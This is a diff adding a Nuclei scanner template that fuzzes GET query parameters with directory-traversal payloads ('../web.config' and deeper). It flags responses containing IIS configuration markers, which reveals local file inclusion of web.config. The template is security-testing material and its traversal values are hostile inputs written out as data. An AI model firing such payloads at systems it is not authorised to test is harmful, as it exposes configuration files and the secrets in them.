@@ -1,0 +1,37 @@
+id: web-config-fuzzing
+
+info:
+  name: Web Config Fuzzing GET Parameters
+  author: reewardius
+  severity: high
+  reference: https://p4n7h3rx.medium.com/how-i-got-a-2000-bounty-with-rxss-e6f45f987793
+  tags: fuzzing-lfi,fuzzing
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      fuzz:
+        - 'web.config'
+        - '../web.config'
+        - '../../web.config'
+        - '../../../web.config'
+        - '../../../../web.config'
+        - '../../../../../web.config'
+        
+    fuzzing:
+      - part: query
+        mode: single
+        type: replace
+        fuzz:
+          - "{{fuzz}}"
+          
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        words:
+          - <configuration>
+          - <system.webServer>
+        condition: and
